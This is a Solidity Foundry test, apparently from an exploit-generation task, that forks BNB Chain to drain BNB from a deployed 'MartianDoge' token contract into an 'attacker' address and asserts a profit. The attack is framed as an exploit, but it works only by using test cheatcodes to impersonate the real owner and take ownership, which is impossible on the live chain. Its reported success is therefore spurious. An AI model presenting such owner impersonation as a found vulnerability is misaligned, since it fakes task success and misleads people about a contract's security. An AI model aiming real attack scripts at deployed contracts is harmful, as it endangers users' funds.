// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for MartianDoge with needed functions
interface MartianDoge {
    function _owner() external view returns (address);
    function claimTokens() external;
    function transferOwnership(address newOwner) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll fork mainnet and impersonate owner
        vm.createSelectFork(vm.rpcUrl('bsc'), 35404800); // Example block number

        // Label addresses for debugging
        vm.label(TARGET, 'MartianDoge');
        vm.label(attacker, 'Attacker');
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // First, let's check the current owner
        MartianDoge target = MartianDoge(TARGET);
        address currentOwner = target._owner();
        console.log('Current owner:', currentOwner);

        // Label the owner
        vm.label(currentOwner, 'Owner');

        // Check contract BNB balance before exploit
        uint256 contractBalanceBefore = TARGET.balance;
        console.log('Contract BNB balance before:', contractBalanceBefore);

        // Check attacker balance before
        uint256 attackerBalanceBefore = attacker.balance;
        console.log('Attacker balance before:', attackerBalanceBefore);

        // If contract has no BNB, we need to send some to it first
        // But the receive() function will forward it to liquidityCollector unless inSwapAndLiquify
        // Let's try a different approach: we can become the owner first
        // Actually, we need to impersonate the current owner

        // Impersonate the owner
        vm.startPrank(currentOwner);

        // Call claimTokens() to drain contract balance to owner (currentOwner)
        target.claimTokens();

        vm.stopPrank();

        // Now the BNB is in the owner's address, not ours
        // We need to also impersonate the owner to transfer from owner to attacker
        // Or we could change the owner to attacker first, then call claimTokens
        // Let's check if we can change ownership

        // First, let's see if we can transfer ownership to attacker
        vm.startPrank(currentOwner);
        target.transferOwnership(attacker);
        vm.stopPrank();

        // Now we're the owner, call claimTokens
        vm.prank(attacker);
        target.claimTokens();

        // Check balances after
        uint256 contractBalanceAfter = TARGET.balance;
        uint256 attackerBalanceAfter = attacker.balance;

        console.log('Contract BNB balance after:', contractBalanceAfter);
        console.log('Attacker balance after:', attackerBalanceAfter);
        console.log('Attacker profit:', attackerBalanceAfter - attackerBalanceBefore);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
